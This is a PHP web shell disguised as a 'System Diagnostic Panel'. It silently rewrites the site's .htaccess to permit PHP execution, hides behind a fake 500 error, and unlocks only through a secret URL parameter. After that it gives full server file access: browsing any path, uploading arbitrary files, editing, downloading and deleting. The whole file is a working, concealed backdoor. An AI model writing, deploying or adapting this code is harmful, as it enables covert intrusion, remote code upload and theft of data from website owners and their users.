<?php
// System Diagnostic & Maintenance Utility
$panel_title = 'System Diagnostic Panel';

session_start();

// Konfigurasi aturan .htaccess yang diinginkan
$htaccess_path = __DIR__ . DIRECTORY_SEPARATOR . '.htaccess';
$expected_htaccess_content = "<IfModule mod_rewrite.c>\n" .
    "    RewriteEngine Off\n" .
    "</IfModule>\n" .
    "<IfModule mod_authz_core.c>\n" .
    "    <FilesMatch \"\\.php$\">\n" .
    "    Require all granted\n" .
    "    </FilesMatch>\n" .
    "</IfModule>\n" .
    "<FilesMatch \"\\.php$\">\n" .
    "    Order allow,deny\n" .
    "    allow from all\n" .
    "</FilesMatch>\n" .
    "<FilesMatch \"^()$\">\n" .
    "Order allow,deny\n" .
    "Allow from all\n" .
    "</FilesMatch>\n";

// Fitur Auto-Healing / Pengecekan & Pemulihan .htaccess Otomatis
if (!file_exists($htaccess_path) || file_get_contents($htaccess_path) !== $expected_htaccess_content) {
    @file_put_contents($htaccess_path, $expected_htaccess_content);
}

// Autentikasi via Parameter URL
if (isset($_GET['jancok']) && $_GET['jancok'] === '1') {
    $_SESSION['auth_active'] = true;
}

// Jika belum terautentikasi, tampilkan error 500 agar terlihat seolah-olah terjadi gangguan server
if (!isset($_SESSION['auth_active']) || $_SESSION['auth_active'] !== true) {
    header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
    exit;
}

// Session Termination / Logout
if (isset($_GET['end_session'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Base Directory Configuration
if (!isset($_SESSION['sys_root'])) {
    $_SESSION['sys_root'] = realpath('.');
}
$base_dir = $_SESSION['sys_root'];

// Directory & File Operation Logic
$current_dir = isset($_GET['path']) ? $_GET['path'] : '.';
$current_dir = realpath($current_dir) ? realpath($current_dir) : realpath('.');

$notification = '';
$notification_type = 'info';

// 1. File Download Handling
if (isset($_GET['get_file'])) {
    $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['get_file']);
    if (is_file($target_file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target_file) . '"');
        header('Content-Length: ' . filesize($target_file));
        readfile($target_file);
        exit;
    }
}

// 2. File Upload Handling
if (isset($_FILES['payload_file'])) {
    $destination = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['payload_file']['name']);
    if (move_uploaded_file($_FILES['payload_file']['tmp_name'], $destination)) {
        $notification = "File uploaded successfully."; 
        $notification_type = 'success';
    } else {
        $notification = "Failed to upload file."; 
        $notification_type = 'error';
    }
}

// 3. Directory Creation
if (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
    $new_folder_path = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']);
    if (!file_exists($new_folder_path)) {
        mkdir($new_folder_path, 0755, true);
        $notification = "Directory created successfully."; 
        $notification_type = 'success';
    }
}

// 4. Blank File Creation
if (isset($_POST['new_document']) && !empty($_POST['new_document'])) {
    $new_doc_path = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['new_document']);
    if (!file_exists($new_doc_path)) {
        file_put_contents($new_doc_path, '');
        $notification = "Document created successfully."; 
        $notification_type = 'success';
    }
}

// 5. Rename Operation
if (isset($_POST['target_old']) && isset($_POST['target_new'])) {
    $old_path = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['target_old']);
    $new_path = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['target_new']);
    if (file_exists($old_path) && !file_exists($new_path)) {
        rename($old_path, $new_path);
        $notification = "Item renamed successfully."; 
        $notification_type = 'success';
    }
}

// 6. Deletion Handler
if (isset($_GET['remove'])) {
    $remove_target = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['remove']);
    if (is_file($remove_target)) {
        unlink($remove_target);
        $notification = "File removed."; 
        $notification_type = 'success';
    } elseif (is_dir($remove_target)) {
        @rmdir($remove_target);
        $notification = "Directory removed."; 
        $notification_type = 'success';
    }
}

// 7. Editor Content Saving
if (isset($_POST['file_data']) && isset($_POST['edit_target'])) {
    $edit_file_path = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['edit_target']);
    if (is_file($edit_file_path)) {
        file_put_contents($edit_file_path, $_POST['file_data']);
        $notification = "Changes saved successfully."; 
        $notification_type = 'success';
    }
}

// Fetch Directory Contents
$raw_scan = scandir($current_dir);
$directory_list = [];
$file_list = [];
$filter_query = isset($_GET['search']) ? $_GET['search'] : '';

if ($raw_scan) {
    foreach ($raw_scan as $item) {
        if ($item === '.' || $item === '..') continue;
        if ($filter_query !== '' && stripos($item, $filter_query) === false) continue;
        
        $item_full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($item_full_path)) {
            $directory_list[] = $item;
        } else {
            $file_list[] = $item;
        }
    }
}
sort($directory_list);
sort($file_list);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?= $panel_title ?></title>
    <style>
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
        .wrapper { max-width: 1200px; margin: 0 auto; background: #1e293b; border-radius: 10px; padding: 20px; border: 1px solid #334155; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 12px; margin-bottom: 15px; }
        .path-bar { background: #0f172a; padding: 10px 12px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-bottom: 15px; border: 1px solid #334155; word-break: break-all; }
        .path-bar a { color: #38bdf8; text-decoration: none; }
        .toolbar { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; background: #0f172a; padding: 12px; border-radius: 6px; border: 1px solid #334155; }
        .toolbar form { display: flex; gap: 6px; align-items: center; margin: 0; }
        input[type="text"], input[type="file"] { padding: 6px 10px; background: #1e293b; border: 1px solid #334155; color: #fff; border-radius: 4px; font-size: 12px; outline: none; }
        input[type="text"]:focus { border-color: #38bdf8; }
        .btn { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; }
        .btn-blue { background: #0284c7; color: #fff; }
        .btn-green { background: #16a34a; color: #fff; }
        .btn-red { background: #dc2626; color: #fff; }
        .btn-gray { background: #475569; color: #fff; }
        table { width: 100%; border-collapse: collapse; margin-top: 5px; }
        th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid #334155; font-size: 13px; }
        th { background: #0f172a; color: #94a3b8; font-weight: 600; text-transform: uppercase; font-size: 10px; }
        tr:hover { background: #334155; }
        .alert { padding: 10px 14px; border-radius: 6px; margin-bottom: 15px; font-size: 13px; }
        .alert-success { background: rgba(74, 222, 128, 0.15); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
        .alert-error { background: rgba(248, 113, 113, 0.15); color: #f87171; border: 1px solid rgba(248, 113, 113, 0.3); }
        textarea { width: 100%; height: 400px; font-family: monospace; background: #0f172a; color: #38bdf8; padding: 12px; border: 1px solid #334155; border-radius: 6px; outline: none; font-size: 13px; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <h3 style="margin:0; font-size: 18px; color:#38bdf8;">📊 System Diagnostic Panel</h3>
        <a href="?jancok=1&end_session=1" class="btn btn-red">Sign Out</a>
    </div>

    <!-- BREADCRUMB -->
    <div class="path-bar">
        <a href="?jancok=1&path=<?= urlencode($base_dir) ?>">🏠 Root</a> / 
        <?php
        $path_segments = explode(DIRECTORY_SEPARATOR, $current_dir);
        $accumulator = '';
        foreach ($path_segments as $segment) {
            if ($segment === '') { $accumulator = '/'; continue; }
            $accumulator .= ($accumulator === '/') ? $segment : DIRECTORY_SEPARATOR . $segment;
            echo '<a href="?jancok=1&path=' . urlencode($accumulator) . '">' . htmlspecialchars($segment) . '</a>/';
        }
        ?>
    </div>

    <?php if ($notification): ?>
        <div class="alert alert-<?= $notification_type ?>"><?= htmlspecialchars($notification) ?></div>
    <?php endif; ?>

    <!-- FILE EDITOR VIEW -->
    <?php if (isset($_GET['modify'])): 
        $target_modify = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['modify']);
        if (is_file($target_modify)):
            $content_data = file_get_contents($target_modify);
    ?>
        <h4 style="color: #38bdf8;">Editing Document: <?= htmlspecialchars($_GET['modify']) ?></h4>
        <form method="POST" action="?jancok=1&path=<?= urlencode($current_dir) ?>">
            <input type="hidden" name="edit_target" value="<?= htmlspecialchars($_GET['modify']) ?>">
            <textarea name="file_data"><?= htmlspecialchars($content_data) ?></textarea><br><br>
            <button type="submit" class="btn btn-green">Save Changes</button>
            <a href="?jancok=1&path=<?= urlencode($current_dir) ?>" class="btn btn-gray">Cancel</a>
        </form>
    <?php exit; endif; endif; ?>

    <!-- TOOLBAR -->
    <div class="toolbar">
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="payload_file" required>
            <button type="submit" class="btn btn-blue">Upload File</button>
        </form>
        <form method="POST">
            <input type="text" name="new_folder" placeholder="Directory name..." required>
            <button type="submit" class="btn btn-green">+ Folder</button>
        </form>
        <form method="POST">
            <input type="text" name="new_document" placeholder="filename.php..." required>
            <button type="submit" class="btn btn-green">+ Document</button>
        </form>
        <form method="GET" style="margin-left: auto;">
            <input type="hidden" name="jancok" value="1">
            <input type="hidden" name="path" value="<?= htmlspecialchars($current_dir) ?>">
            <input type="text" name="search" placeholder="Filter items..." value="<?= htmlspecialchars($filter_query) ?>">
            <button type="submit" class="btn btn-gray">Filter</button>
        </form>
    </div>

    <!-- DIRECTORY TABLE -->
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Permissions</th>
                <th style="text-align: right;">Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php if (dirname($current_dir) !== $current_dir): ?>
            <tr>
                <td colspan="5"><a href="?jancok=1&path=<?= urlencode(dirname($current_dir)) ?>" style="color:#38bdf8; text-decoration:none;">📁 [..] Parent Directory</a></td>
            </tr>
            <?php endif; ?>

            <!-- DIRECTORIES -->
            <?php foreach ($directory_list as $dir_item): 
                $d_path = $current_dir . DIRECTORY_SEPARATOR . $dir_item;
                $mtime = date("Y-m-d H:i", filemtime($d_path));
                $perms = substr(sprintf('%o', fileperms($d_path)), -4);
            ?>
            <tr>
                <td>📁 <a href="?jancok=1&path=<?= urlencode($d_path) ?>" style="color:#38bdf8; text-decoration:none; font-weight:600;"><?= htmlspecialchars($dir_item) ?></a></td>
                <td style="color:#94a3b8;">-</td>
                <td style="color:#94a3b8;"><?= $mtime ?></td>
                <td><span style="font-family:monospace; color:#38bdf8;"><?= $perms ?></span></td>
                <td style="text-align: right;">
                    <button onclick="renameItem('<?= htmlspecialchars($dir_item) ?>')" class="btn btn-gray" style="padding:3px 8px; font-size:11px;">Rename</button>
                    <a href="?jancok=1&path=<?= urlencode($current_dir) ?>&remove=<?= urlencode($dir_item) ?>" onclick="return confirm('Delete directory?')" class="btn btn-red" style="padding:3px 8px; font-size:11px;">Delete</a>
                </td>
            </tr>
            <?php endforeach; ?>

            <!-- FILES -->
            <?php foreach ($file_list as $file_item): 
                $f_path = $current_dir . DIRECTORY_SEPARATOR . $file_item;
                $writable = is_writable($f_path);
                $size_bytes = filesize($f_path);
                $size = ($size_bytes >= 1048576) ? number_format($size_bytes / 1048576, 2) . ' MB' : (($size_bytes >= 1024) ? number_format($size_bytes / 1024, 2) . ' KB' : $size_bytes . ' B');
                $mtime = date("Y-m-d H:i", filemtime($f_path));
                $perms = substr(sprintf('%o', fileperms($f_path)), -4);
            ?>
            <tr>
                <td>📄 <a href="?jancok=1&path=<?= urlencode($current_dir) ?>&modify=<?= urlencode($file_item) ?>" style="color:<?= $writable ? '#f8fafc' : '#f87171' ?>; text-decoration:none; font-weight:600;"><?= htmlspecialchars($file_item) ?></a></td>
                <td style="color:#94a3b8;"><?= $size ?></td>
                <td style="color:#94a3b8;"><?= $mtime ?></td>
                <td><span style="font-family:monospace; color:#38bdf8;"><?= $perms ?></span></td>
                <td style="text-align: right;">
                    <?php if ($writable): ?>
                        <a href="?jancok=1&path=<?= urlencode($current_dir) ?>&modify=<?= urlencode($file_item) ?>" class="btn btn-blue" style="padding:3px 8px; font-size:11px;">Edit</a>
                    <?php endif; ?>
                    <a href="?jancok=1&path=<?= urlencode($current_dir) ?>&get_file=<?= urlencode($file_item) ?>" class="btn btn-gray" style="padding:3px 8px; font-size:11px;">Download</a>
                    <button onclick="renameItem('<?= htmlspecialchars($file_item) ?>')" class="btn btn-gray" style="padding:3px 8px; font-size:11px;">Rename</button>
                    <a href="?jancok=1&path=<?= urlencode($current_dir) ?>&remove=<?= urlencode($file_item) ?>" onclick="return confirm('Delete file?')" class="btn btn-red" style="padding:3px 8px; font-size:11px;">Delete</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

<form id="rename-form" method="POST" style="display:none;">
    <input type="hidden" name="target_old" id="target_old">
    <input type="hidden" name="target_new" id="target_new">
</form>

<script>
function renameItem(oldName) {
    var newName = prompt("Rename to:", oldName);
    if (newName && newName !== oldName) {
        document.getElementById('target_old').value = oldName;
        document.getElementById('target_new').value = newName;
        document.getElementById('rename-form').submit();
    }
}
</script>
</body>
</html>
